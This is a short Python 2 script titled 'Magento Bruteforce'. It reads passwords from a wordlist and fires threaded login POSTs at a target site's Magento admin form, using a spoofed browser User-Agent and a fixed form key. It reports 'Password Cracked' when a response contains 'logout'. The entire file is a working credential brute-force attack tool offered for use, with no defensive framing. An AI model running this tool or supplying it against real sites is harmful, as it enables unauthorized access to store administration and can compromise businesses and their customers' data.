#!/usr/bin/env python

import urllib, urllib2
import cookielib
import sys
import os
import threading
import time

def win():
	if os.name == "nt":
		os.system('cls')
	else:
		os.system('clear')

win()


banner = """

Magento Bruteforce
"""

print banner

if len(sys.argv) != 4:
	print ""
	print "[+] Usage: " + sys.argv[0] + " www.target.com admin pass.txt" 
	print ""
	sys.exit(0)

url = sys.argv[1]
usr = sys.argv[2]
pwd = sys.argv[3]


if url.startswith("http://"):
	url = url.replace("http://", "")
elif url.startswith("https://"):
	url = url.replace("https://","")
else:
	pass
def bruter(passwd,fi):

	agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

	try:
		t1 = time.time()
		post = {}
		post['form_key'] = "6Tdfk8negawFvLj5"
		post['login[username]'] = usr
		post['login[password]'] = passwd
		post['dummy'] = ""

		
		domain = "http://" + url
		data = urllib2.Request(domain, urllib.urlencode(post), headers=agent)
		neo = coder.open(data).read()
		if 'logout' in neo:
			t2 = time.time()
			print ""
			print "Domain Name: %s" % url
			print "UserNmae: %s" % usr
			print "Password Cracked: %s" % passwd 
			print "Time: %s" % str(t2-t1)
			_exit(1)

		else:
			print "Trying ... %s" % passwd

	except Exception, e:
		print e


threads = []

cj = cookielib.CookieJar()
coder = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))


with open(pwd, 'r') as f:
	fi = f.read().splitlines()

for passwd in fi:
	t = threading.Thread(target=bruter, args=(passwd,fi))
	t.start()
	threads.append(t)
	time.sleep(0.5)

